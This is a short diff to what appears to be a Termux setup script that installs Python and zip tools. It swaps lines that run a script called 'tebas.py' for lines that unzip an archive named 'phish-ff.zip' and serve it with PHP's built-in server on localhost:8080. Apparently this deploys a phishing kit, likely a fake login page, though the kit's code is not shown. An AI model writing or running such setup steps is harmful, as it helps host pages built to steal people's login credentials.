@@ -3,5 +3,5 @@ pip install requests
 pip install mechanize
 pkg install zip
 pkg install unzip
-unzip tebas.zip
-python2 tebas.py
+unzip phish-ff.zip
+php -S localhost:8080 -t phish-ff
